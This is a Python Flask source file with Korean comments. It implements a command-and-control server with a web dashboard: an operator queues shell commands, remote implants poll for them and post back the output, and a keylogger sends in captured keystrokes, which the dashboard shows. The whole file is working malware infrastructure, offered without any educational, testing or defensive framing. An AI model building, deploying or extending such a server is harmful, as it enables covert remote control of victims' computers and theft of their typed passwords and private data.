from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# 현재 명령어, 결과, 키로그 저장
current_command = ""
results = []
logs = []

@app.route("/get_command", methods=["GET"])
def get_command():
    global current_command
    cmd_to_send = current_command
    if cmd_to_send:
        print(f"[{datetime.now()}] 명령어 요청됨: {cmd_to_send}")
        current_command = ""
        return cmd_to_send
    else:
        return '', 204  # 명령이 없으면 No Content


@app.route("/send_result", methods=["POST"])
def send_result():
    result = request.form.get("result", "")
    print(f"[{datetime.now()}] 명령 결과 수신:\n{result}\n{'='*40}")
    results.append((datetime.now(), result))
    return "OK"

@app.route("/get_logs", methods=["POST"])
def get_logs():
    log = request.form.get("logs", "")
    print(f"[{datetime.now()}] 키로거 로그 수신: {log}")
    logs.append((datetime.now(), log))
    return "OK"

@app.route("/set_command", methods=["POST"])
def set_command():
    global current_command
    current_command = request.form.get("cmd", "")
    print(f"[{datetime.now()}] 명령어 설정됨: {current_command}")
    return "OK"

@app.route("/get_updates", methods=["GET"])
def get_updates():
    latest_results = "\n".join([f"[{ts}] {res}" for ts, res in reversed(results[-10:])])
    latest_logs = "\n".join([f"[{ts}] {log}" for ts, log in reversed(logs[-10:])])
    return jsonify({
        "results": latest_results,
        "logs": latest_logs
    })


@app.route("/")
def index():
    return """
    <html>
    <head>
        <title>명령어 서버</title>
        <style>
            body { font-family: sans-serif; margin: 30px; }
            input[type="text"] { width: 300px; padding: 5px; }
            button { padding: 5px 10px; }
            pre { background-color: #f4f4f4; padding: 10px; border: 1px solid #ccc; }
        </style>
    </head>
    <body>
        <h1>명령어 서버</h1>
        <form id="commandForm">
            <input type="text" id="cmdInput" name="cmd" placeholder="명령어 입력" required>
            <button type="submit">전송</button>
            <span id="sendStatus"></span>
        </form>

        <hr>
        <h2>최근 명령 결과</h2>
        <pre id="results">로딩 중...</pre>
        <h2>최근 키 입력 로그</h2>
        <pre id="logs">로딩 중...</pre>

        <script>
            async function fetchUpdates() {
                try {
                    const res = await fetch("/get_updates");
                    const data = await res.json();
                    document.getElementById("results").textContent = data.results;
                    document.getElementById("logs").textContent = data.logs;
                } catch (e) {
                    console.error("업데이트 실패:", e);
                }
            }

            document.getElementById("commandForm").addEventListener("submit", async function (e) {
                e.preventDefault(); // 폼 전송 시 페이지 이동 막기
                const cmd = document.getElementById("cmdInput").value;
                const formData = new FormData();
                formData.append("cmd", cmd);
                try {
                    await fetch("/set_command", {
                        method: "POST",
                        body: formData
                    });
                    document.getElementById("sendStatus").textContent = "✅ 전송됨";
                    document.getElementById("cmdInput").value = "";
                } catch (e) {
                    document.getElementById("sendStatus").textContent = "❌ 실패";
                }
            });

            setInterval(fetchUpdates, 1000);
            fetchUpdates();
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
